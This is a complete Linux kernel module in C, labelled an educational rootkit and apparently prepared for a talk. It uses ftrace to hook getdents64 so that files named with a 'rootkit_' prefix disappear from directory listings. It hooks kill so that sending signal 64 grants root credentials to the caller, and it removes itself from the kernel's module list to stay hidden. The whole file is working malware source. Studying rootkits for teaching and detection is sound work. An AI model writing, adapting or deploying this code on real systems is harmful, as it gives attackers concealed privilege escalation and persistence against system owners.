#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Charla Ring 0");
MODULE_DESCRIPTION("Rootkit educativo - ftrace hooks");

/* -- Config -- */
#define HIDE_PREFIX   "rootkit_"
#define MAGIC_SIGNAL  64

/* -- Resolve kallsyms_lookup_name via kprobe -- */
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
static kallsyms_lookup_name_t my_kallsyms_lookup_name;

static int resolve_kallsyms(void)
{
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
    int ret = register_kprobe(&kp);
    if (ret < 0) return ret;
    my_kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    return 0;
}

/* ====== FTRACE HOOK INFRASTRUCTURE ====== */

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

static int resolve_hook_address(struct ftrace_hook *hook)
{
    hook->address = my_kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "rootkit: no se encontro %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long*) hook->original) = hook->address;
    return 0;
}

static void notrace ftrace_thunk(unsigned long ip, unsigned long parent_ip,
    struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct pt_regs *regs = ftrace_get_regs(fregs);
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
}

static int install_hook(struct ftrace_hook *hook)
{
    int err;

    err = resolve_hook_address(hook);
    if (err)
        return err;

    hook->ops.func = ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                    | FTRACE_OPS_FL_RECURSION
                    | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        printk(KERN_ERR "rootkit: ftrace_set_filter_ip fallo para %s: %d\n", hook->name, err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        printk(KERN_ERR "rootkit: register_ftrace_function fallo para %s: %d\n", hook->name, err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    printk(KERN_INFO "rootkit: hook instalado en %s @ %lx\n", hook->name, hook->address);
    return 0;
}

static void remove_hook(struct ftrace_hook *hook)
{
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    printk(KERN_INFO "rootkit: hook removido de %s\n", hook->name);
}

/* ====== HOOK: getdents64 ====== */

typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
static orig_getdents64_t orig_getdents64;

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *current_dir, *kbuf, *prev = NULL;
    long ret;
    unsigned long offset = 0;

    ret = orig_getdents64(regs);
    if (ret <= 0)
        return ret;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, dirent, ret)) {
        kfree(kbuf);
        return ret;
    }

    while (offset < ret) {
        current_dir = (void *)kbuf + offset;

        if (strncmp(current_dir->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
            if (current_dir == kbuf) {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += current_dir->d_reclen;
        } else {
            prev = current_dir;
        }
        offset += current_dir->d_reclen;
    }

    if (copy_to_user(dirent, kbuf, ret)) {
        kfree(kbuf);
        return ret;
    }
    kfree(kbuf);
    return ret;
}

/* ====== HOOK: kill ====== */

typedef asmlinkage long (*orig_kill_t)(const struct pt_regs *);
static orig_kill_t orig_kill;

static void give_root(void)
{
    struct cred *new_cred;
    new_cred = prepare_creds();
    if (!new_cred) return;
    new_cred->uid.val  = 0;
    new_cred->gid.val  = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    new_cred->suid.val = 0;
    new_cred->sgid.val = 0;
    commit_creds(new_cred);
    printk(KERN_INFO "rootkit: root otorgado a pid %d\n", current->pid);
}

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = (int) regs->si;

    if (sig == MAGIC_SIGNAL) {
        printk(KERN_INFO "rootkit: senal magica recibida de pid %d\n", current->pid);
        give_root();
        return 0;
    }

    return orig_kill(regs);
}

/* ====== HOOK TABLE ====== */

static struct ftrace_hook hooks[] = {
    {
        .name     = "__x64_sys_getdents64",
        .function = hook_getdents64,
        .original = &orig_getdents64,
    },
    {
        .name     = "__x64_sys_kill",
        .function = hook_kill,
        .original = &orig_kill,
    },
};

#define NHOOKS (sizeof(hooks) / sizeof(hooks[0]))

/* ====== HIDE MODULE ====== */

static struct list_head *prev_module;
static int module_hidden = 0;

static void hide_module(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    module_hidden = 1;
    printk(KERN_INFO "rootkit: modulo oculto\n");
}

static void show_module(void)
{
    list_add(&THIS_MODULE->list, prev_module);
    module_hidden = 0;
    printk(KERN_INFO "rootkit: modulo visible\n");
}

/* ====== INIT / EXIT ====== */

static int __init rootkit_init(void)
{
    int err, i;

    printk(KERN_INFO "rootkit: iniciando...\n");

    err = resolve_kallsyms();
    if (err) {
        printk(KERN_ERR "rootkit: no se pudo resolver kallsyms\n");
        return err;
    }

    for (i = 0; i < NHOOKS; i++) {
        err = install_hook(&hooks[i]);
        if (err) {
            while (i > 0) {
                i--;
                remove_hook(&hooks[i]);
            }
            return err;
        }
    }

    hide_module();
    printk(KERN_INFO "rootkit: todos los hooks instalados!\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    int i;

    for (i = 0; i < NHOOKS; i++)
        remove_hook(&hooks[i]);

    if (module_hidden)
        show_module();

    printk(KERN_INFO "rootkit: descargado\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
